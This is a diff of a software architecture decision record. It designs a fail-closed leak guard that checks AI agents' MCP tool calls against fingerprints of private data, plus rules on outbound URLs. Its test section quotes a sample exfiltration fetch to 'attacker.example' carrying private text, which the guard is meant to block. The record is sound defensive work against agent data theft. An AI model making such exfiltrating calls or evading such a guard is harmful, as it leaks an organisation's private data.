@@ -4,7 +4,7 @@
 - Date: 2026-10-31
 - Amends: [0042](0042-ask-tier-park-and-execute.md) (a leak becomes an approval), [0057](0057-mcp-servers.md) (servers declare a data class and kind; every org route carries the guard)
 - Relates to: [0051](0051-session-home-generations.md) (home generations), [0040](0040-agentgateway-model-and-mcp-gateway.md), [0023](0023-observability-and-audit.md), [0020](0020-agent-builder-and-templates.md)
-- Issue: #347, part of #265; implemented by #348, #349, #350, #351 and #352
+- Issue: koinon-private#347, part of #51; implemented by koinon-private#348, koinon-private#349, koinon-private#350, koinon-private#351 and #70
 
 ## Context
 
@@ -17,7 +17,7 @@ outside the sandbox, so OpenShell's proxy never sees it, and an auto-tier tool n
 legs (`templates/researcher.yaml`, the `web_url_read` grant; `test/fixtures/rt1/README.md`, the
 SearXNG fixture next to private docs and FinOps data).
 
-Issue #265 first proposed computing the three legs from each agent version's grants and forcing the
+Issue #51 first proposed computing the three legs from each agent version's grants and forcing the
 ask tier on every outbound tool when all three hold. Andre rejected that on 2026-10-31: approval
 fatigue makes people approve without reading, which protects nothing. The goal is a guard that adds
 no human click in normal use ("no agent nannies"), so that a person only ever sees a real leak
@@ -37,7 +37,7 @@ while the synthetic encoded and split leaks were caught.
 1. **The guard lives in koinon-api.** agentgateway's ExtMcp `mcpGuardrails` calls it on every MCP
    tool call: configured as a remote processor, `failClosed`, on each org's MCP route (the
    reconciler renders it). The guard decides on the call's arguments and returns allow or block; it
-   uses the pure package `internal/leakguard` (#348), wired in #349.
+   uses the pure package `internal/leakguard` (koinon-private#348), wired in koinon-private#349.
 2. **A taint store of private data.** The guard keeps winnowed fingerprints of private data,
    normalised and taken over windows, not the private text itself. Two feeds fill it:
    - **agentd** fingerprints the tool results it sees inside the sandbox (repository reads, shell
@@ -54,7 +54,7 @@ while the synthetic encoded and split leaks were caught.
 5. **An automatic shape-and-budget URL rule.** To a host the org has not allowed, an outbound URL
    must not carry a long query string, encoded data in its path or a high-entropy blob, and stays
    within per-host and per-run budgets. The rule needs no configuration and no human click. The
-   **org fetch-trusted host list**, the hosts exempt from the rule, **starts empty** (#350).
+   **org fetch-trusted host list**, the hosts exempt from the rule, **starts empty** (koinon-private#350).
 6. **Sinks.** Fetches and **web search queries** are outbound sinks: a search query is checked like
    a fetch, since the query text leaves for the search provider.
 7. **Only a real leak becomes an approval.** A call whose arguments match the taint store is blocked
@@ -62,13 +62,13 @@ while the synthetic encoded and split leaks were caught.
    would leave (the matched text in the arguments). A call that does not match passes with no
    approval and no delay a person would notice. Forcing the ask tier on every outbound call of an
    agent with all three legs is rejected.
-8. **MCP servers declare their data class and kind** (#350). A server record says which legs it
+8. **MCP servers declare their data class and kind** (koinon-private#350). A server record says which legs it
    carries (untrusted input, private data, outbound tool) and its kind (for example fetch or
    search), so the guard and the template test read a declaration instead of guessing from names.
 9. **Templates.** `researcher` becomes private-only (repositories and private data, no web reads); a
    new `web-researcher` is web-only (web reads and search, no private data). No shipped template
    combines untrusted input, private data and an auto-tier outbound tool, and a templates test
-   fails if one does (#351).
+   fails if one does (koinon-private#351).
 10. **Failure mode: fail closed.** When koinon-api is unreachable, or the guard does not answer in
     time, agentgateway refuses the MCP call and the agent gets a clear error saying the tool call
     could not be checked. No MCP call leaves unchecked. Model requests are not affected (the guard
@@ -79,7 +79,7 @@ while the synthetic encoded and split leaks were caught.
     component an org depends on.
 11. **A Koinon-owned fetch server follows in v0.2.** Until then the guard sits in front of whatever
     fetch and search servers an org adds; v0.1 does not ship its own.
-12. **Tests keep it honest** (#352): a replay suite of rc.9-shaped traffic asserts no blocks on
+12. **Tests keep it honest** (#70): a replay suite of rc.9-shaped traffic asserts no blocks on
     benign traffic and a block on each synthetic leak; RT1 fixtures carry canary private strings
     for local real-model runs; the escape suite has an exfil case (a fake-model agent told to fetch
     `https://attacker.example/?d=<private text>` is blocked and an approval appears, a clean fetch
@@ -110,7 +110,7 @@ sequenceDiagram
 ## Alternatives considered
 
 - **Force the ask tier on every outbound tool when an agent holds all three legs** (the original
-  proposal in #265). Rejected by Andre: every research run would ask, people would approve without
+  proposal in #51). Rejected by Andre: every research run would ask, people would approve without
   reading, and the control would protect nothing.
 - **A URL policy in the fetch server only.** Catches query-string exfiltration to unknown hosts but
   not a search query, a split or encoded excerpt, or a server Koinon does not run. Kept as one part
@@ -139,42 +139,42 @@ sequenceDiagram
 - Negative: org admins who rely on long-query URLs to a host must add it to the fetch-trusted list.
 - Metrics follow ADR 0023: guard decisions are counted with fixed labels (decision and reason), never
   org, agent, run or ticket IDs. Changes to the fetch-trusted host list and the threshold are audited
-  (#350).
-- Follow-ups: #348 (normaliser, decoders, taint store, URL rule), #349 (mcpGuardrails per org route,
-  agentd fingerprints, guard endpoint), #350 (data class and kind, fetch-trusted hosts, threshold),
-  #351 (template split and the three-legs test), #352 (replay suite, RT1 canaries, escape case); the
+  (koinon-private#350).
+- Follow-ups: koinon-private#348 (normaliser, decoders, taint store, URL rule), koinon-private#349 (mcpGuardrails per org route,
+  agentd fingerprints, guard endpoint), koinon-private#350 (data class and kind, fetch-trusted hosts, threshold),
+  koinon-private#351 (template split and the three-legs test), #70 (replay suite, RT1 canaries, escape case); the
   Koinon fetch server in v0.2.
 
 ## Open questions
 
-The decisions on #265 leave these open; each is settled in the implementation issue named.
+The decisions on #51 leave these open; each is settled in the implementation issue named.
 
 - **URL-rule violations:** a taint match becomes an approval (decision 7). Whether a URL-rule block
   without a taint match also becomes an approval, or is a plain refusal with a reason the agent can
-  act on, is not decided (#349's text says approval; "only a real leak reaches a person" suggests a
+  act on, is not decided (koinon-private#349's text says approval; "only a real leak reaches a person" suggests a
   refusal).
 - **Numbers of the URL rule:** the maximum query-string length, what counts as encoded path data,
-  the entropy threshold and the per-host and per-run budgets (#348).
+  the entropy threshold and the per-host and per-run budgets (koinon-private#348).
 - **Normalisation details:** the exact Unicode form, which characters count as separators, and how
-  far a split across arguments is reassembled (#348).
+  far a split across arguments is reassembled (koinon-private#348).
 - **Which calls the taint check applies to:** every call's arguments, or only tools of servers
   declared outbound. In particular, an ask-tier tool on a private-data server (a GitHub comment)
-  already needs approval; whether its card is also marked when it matches is open (#349).
+  already needs approval; whether its card is also marked when it matches is open (koinon-private#349).
 - **The agent-facing result of a blocked call:** an ExtMcp block, or the "approval requested" result
   of ADR 0042 so that the run parks and Koinon executes the call after approval through the ADR 0057
-  executor (#349).
-- **Approval scopes:** whether an AP1 scope (ADR 0042) may ever cover a leak approval (#349).
+  executor (koinon-private#349).
+- **Approval scopes:** whether an AP1 scope (ADR 0042) may ever cover a leak approval (koinon-private#349).
 - **Where the taint store lives:** in koinon-api memory or in Postgres, how it survives a koinon-api
-  restart and works with several replicas, its size limit and eviction (#348, #349).
+  restart and works with several replicas, its size limit and eviction (koinon-private#348, koinon-private#349).
 - **Fingerprint keying:** whether fingerprints are keyed per home generation, so that a hash of a
-  short window cannot be reversed by guessing (#348).
-- **Guard timeout:** the ExtMcp processor timeout the reconciler renders (#349).
+  short window cannot be reversed by guessing (koinon-private#348).
+- **Guard timeout:** the ExtMcp processor timeout the reconciler renders (koinon-private#349).
 - **An emergency bypass:** whether an org or platform admin can switch the guard off for an org while
   koinon-api is degraded; none is decided, so none is built.
 
-## Amendment (2026-11-03, #348): the work budget decides, the clock is a 5 s backstop
+## Amendment (2026-11-03, koinon-private#348): the work budget decides, the clock is a 5 s backstop
 
-Andre, 2026-11-03: "A work limit decides; 5 s backstop". The first core (#348) bounded one taint
+Andre, 2026-11-03: "A work limit decides; 5 s backstop". The first core (koinon-private#348) bounded one taint
 check by a work counter (`MaxWorkBytes`, 32 MiB) and a wall clock of 1 s. On a loaded lab node (3 CPUs,
 other test packages in parallel) benign calls took 1.0 to 1.1 s and the one-core smoke test 2.8 s, so
 the clock refused calls that were fine: how long a check takes depends on the machine, not on the
@@ -188,13 +188,13 @@ call. Now:
 - `MaxDuration` defaults to 5 s and is a safety net for a stuck or starved machine, not a policy. A
   benign call must not depend on it. It stays fail-closed (`budget_time`), and a cancelled context
   still ends a check at once.
-- The guard timeout the reconciler renders for the ExtMcp processor (open question above, #349)
+- The guard timeout the reconciler renders for the ExtMcp processor (open question above, koinon-private#349)
   must be longer than the 5 s backstop plus the store lookup, so the guard answers before agentgateway
   gives up.
 
-### Amendment 2026-11-03: the data class and the org settings (#350)
+### Amendment 2026-11-03: the data class and the org settings (koinon-private#350)
 
-The data model #349 builds on, as shipped in migration `00050`:
+The data model koinon-private#349 builds on, as shipped in migration `00050`:
 
 - **Kind and legs.** `mcp_servers.kind` is `fetch`, `search` or `other` (enum `mcp_server_kind`). The
   server legs are two booleans (`exposes_untrusted_input`, `exposes_private_data`), not an array: the
@@ -246,7 +246,7 @@ The data model #349 builds on, as shipped in migration `00050`:
   internal. A write derives as **internal only if the linked connection lists the repository, not
   public, with a fresh reading**. A server with no link, a public, unknown, unlisted or stale
   repository, a foreign owner, a non-ASCII or unparsable name derives external-high. Names are ASCII
-  only (U+212A lower-cases to `k`). Decision of #350 on the ADR's open question: a reading is **fresh
+  only (U+212A lower-cases to `k`). Decision of koinon-private#350 on the ADR's open question: a reading is **fresh
   for 1 hour** (`DefaultVisibilityMaxAge`) and a stale one counts as unknown; a reading dated more
   than a minute in the future counts as stale on read and is refused by `ReplaceCodeHostRepos`, the
   writer a connector uses. The leak-guard view reports the counts by visibility and how many are stale.
@@ -256,7 +256,7 @@ The data model #349 builds on, as shipped in migration `00050`:
 - **Fetch-trusted hosts.** `org_fetch_trusted_hosts(org_id, id, host)`, empty for a new org, at most
   256 per org (the cap is checked under a lock on the org's settings row, so parallel adds cannot pass
   it). Add and remove are audited as `org.fetch_trusted_host.add` and `.remove`. Andre's contract
-  (2026-11-03), which #349 relies on (`LeakGuard.TrustsHost`):
+  (2026-11-03), which koinon-private#349 relies on (`LeakGuard.TrustsHost`):
   - An entry is one lower-case DNS name, matched **exactly**: `docs.example.com` trusts that host, not
     its subdomains and not its parent.
   - An admin may also add a **wildcard** entry `*.example.com` on purpose. It trusts any subdomain at
@@ -279,11 +279,11 @@ The data model #349 builds on, as shipped in migration `00050`:
 
 agentgateway v1.6.0 ExtMcp (`ext_mcp.proto`, request and response checks) was exercised in the
 OpenShell spike, step 6.5 (ADR 0048). The `mcpGuardrails` failClosed behaviour per route is verified
-by the render and API tests of #349.
+by the render and API tests of koinon-private#349.
 
 ## Links
 
-- Issue #265 and Andre's decision comments of 2026-10-31: [before v0.1.0, no agent nannies](https://github.com/stateracloud/koinon/issues/265#issuecomment-6536011535), [guard in koinon-api](https://github.com/stateracloud/koinon/issues/265#issuecomment-6537259664), [details](https://github.com/stateracloud/koinon/issues/265#issuecomment-6537327578)
+- Issue #51 and Andre's decision comments of 2026-10-31: [before v0.1.0, no agent nannies](https://github.com/stateracloud/koinon/issues/51#issuecomment-6536011535), [guard in koinon-api](https://github.com/stateracloud/koinon/issues/51#issuecomment-6537259664), [details](https://github.com/stateracloud/koinon/issues/51#issuecomment-6537327578)
 - Research store: deep dive G1, `g1-trifecta-controls`; harness research round 3, `research/harness-r3/SYNTHESIS.md` §5.2
 - https://agentgateway.dev/docs/standalone/main/mcp/guardrails/about/
 - ADRs [0042](0042-ask-tier-park-and-execute.md), [0048](0048-openshell-spike-results.md), [0051](0051-session-home-generations.md), [0057](0057-mcp-servers.md), [0023](0023-observability-and-audit.md)
